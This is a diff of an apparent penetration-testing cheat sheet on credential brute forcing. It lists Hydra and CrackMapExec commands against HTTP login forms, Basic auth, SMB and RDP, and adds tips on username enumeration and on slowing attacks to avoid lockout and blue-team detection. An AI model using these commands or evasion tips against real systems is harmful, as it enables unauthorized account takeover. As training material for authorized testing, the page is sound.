@@ -1,4 +1,4 @@
-## Identifying Authentication Mechanism
+# Credential Brute Forcing
 
 !!! tip "Tip"
     Username enumeration via timing or error message differences is often easier than brute-forcing — confirm valid usernames first, then target those with a password list.
@@ -6,70 +6,53 @@
 !!! warning "Watch out"
     Always check for account lockout before running hydra or Burp Intruder. A single locked account will alert a blue team immediately. Test with 2-3 attempts on a throwaway account first.
 
-Before brute-forcing, determine the type of authentication used:
+---
 
-1. **Form-Based Authentication**
-    - Uses `username` and `password` fields in an HTML form.
-    - Typically sends HTTP `POST` requests for login.
-    
-2. **Basic/Digest Authentication**
-    - Sends credentials via `Authorization: Basic <Base64-encoded credentials>` in HTTP headers.
-    - Often used for web servers and API endpoints.
-    
-3. **Token-Based Authentication (JWT, OAuth, API Keys)**
-    - Uses tokens for authentication instead of passwords.
-    - Often found in modern API authentication mechanisms.
+## Hydra
 
-## Brute-Forcing Login Credentials
-
-### Hydra
-
-#### HTTP Basic Authentication
+### HTTP Basic Authentication
 
 ```bash
-hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt 192.168.177.90 http-get
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt 10.10.10.10 http-get
 ```
 
-#### HTTP POST Form Brute-Force
+### HTTP POST Form
 
-```
-hydra -L users.txt -P passwords.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
-```
-
-- `-L users.txt` → Uses a list of usernames.
-- `-P passwords.txt` → Uses a list of passwords
-- `:F=incorrect` → Defines a failed login message to filter incorrect attempts.
-
-#### SMB Brute-Force
-
-```
-hydra -L users.txt -P passwords.txt smb://192.168.1.10
+```bash
+hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
 ```
 
-### CrackMapExec
+### SMB
 
-#### Brute-Forcing Web Authentication
-
-```
-crackmapexec http <target-ip> -u users.txt -p passwords.txt --auth-form /login.php
+```bash
+hydra -L users.txt -P passwords.txt smb://10.10.10.10
 ```
 
-- `-u users.txt` → Usernames list.
-- `-p passwords.txt` → Passwords list.
-- `--auth-form /login.php` → Targets a login form for brute-force attempts.
+---
 
-#### SMB Brute-Forcing
-```
-crackmapexec smb <target-ip> -u users.txt -p passwords.txt
-```
+## CrackMapExec
 
+### Web Authentication
 
-#### RDP Brute-Forcing
-```
-crackmapexec rdp <target-ip> -u users.txt -p passwords.txt
+```bash
+crackmapexec http 10.10.10.10 -u users.txt -p passwords.txt --auth-form /login.php
 ```
 
-## Preventing Account Lockout
+### SMB
 
-- **Use a slow attack rate**: Adding delays between requests reduces detection.
-- **Monitor response messages**: Some applications return different error messages for valid vs. invalid users.
+```bash
+crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
+```
+
+### RDP
+
+```bash
+crackmapexec rdp 10.10.10.10 -u users.txt -p passwords.txt
+```
+
+---
+
+## Lockout Prevention
+
+- Use a slow attack rate: add delays between requests to reduce detection.
+- Monitor response messages: some applications return different error messages for valid vs. invalid users.
